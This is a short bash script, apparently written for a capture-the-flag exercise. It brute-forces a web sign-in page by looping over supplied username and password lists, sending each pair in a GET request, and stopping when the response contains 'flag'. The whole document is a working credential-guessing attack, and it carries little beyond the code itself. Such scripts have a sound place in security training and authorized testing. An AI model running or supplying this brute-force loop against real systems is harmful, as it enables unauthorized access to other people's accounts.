#!/bin/bash
echo "Enter target IP:";
read ip
echo "Enter path of possible usernames:"
read usernames
echo "Enter path of possible passwords:";
read passwords
clear;
echo "script testing ...";

while IFS= read -r login; do
	while IFS= read -r pass; do
	#	echo "Text read from file: $pass"
		curl -s http://$ip/\?page\=signin\&username\=$login\&password\=$pass\&Login\=Login\# | grep -q flag
	    if [ $? -eq 0 ]; then
			clear;
			echo "username: $login";
			echo "password: $pass";
			exit 0;
		fi	
	done < $passwords
done < $usernames
